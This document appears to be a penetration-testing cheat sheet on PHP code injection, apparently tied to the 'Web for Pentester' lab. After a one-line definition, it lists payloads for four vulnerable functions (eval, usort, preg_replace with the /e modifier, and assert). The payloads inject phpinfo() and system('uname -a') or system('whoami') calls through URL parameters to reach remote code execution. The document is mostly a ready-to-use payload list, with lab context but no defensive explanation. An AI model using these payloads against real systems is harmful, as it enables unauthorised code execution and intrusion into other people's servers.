##Code Injection
Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. These types of attacks are usually made possible due to a lack of proper input/output data validation

<h3>Web for Penterster</h3> 
<h3>example 1</h3> 
<b>eval()</b> - evaluates a string as PHP code <br>
<b>payload</b>- " .phpinfo(). "  <br>
<b>payload</b>- " . hacker".system('uname -a');#       - change to RCE  & url encode need 


<h3>example 2</h3> 
<b>usort()</b>- Sort an array by values using a user-defined comparison function<br>
<b>payload</b>-example2.php?order=id,system('whoami') <br>
<b>payload</b>- example2.php?order=id);}system('whoami');#      - change to RCE  & url encode need 


<h3>example 3</h3> 
<b>preg_replace()</b> — Perform a regular expression search and replace<br>
<b>payload</b> - example3.php?new=phpinfo()&pattern=/lamer/e&base=Hello lamer"  <br>
<b>payload</b> - example3.php?new=system('uname -a')&pattern=/lamer/e&base=Hello lamer         - change to RCE


<h3>example 4</h3> 
<b>assert()</b> - Checks if assertion is FALSE <br>
<b>payload</b> - example4.php?name=hacker'.phpinfo().' <br>
<b>payload</b> - example4.php?name=hacker'.system('uname -a').'
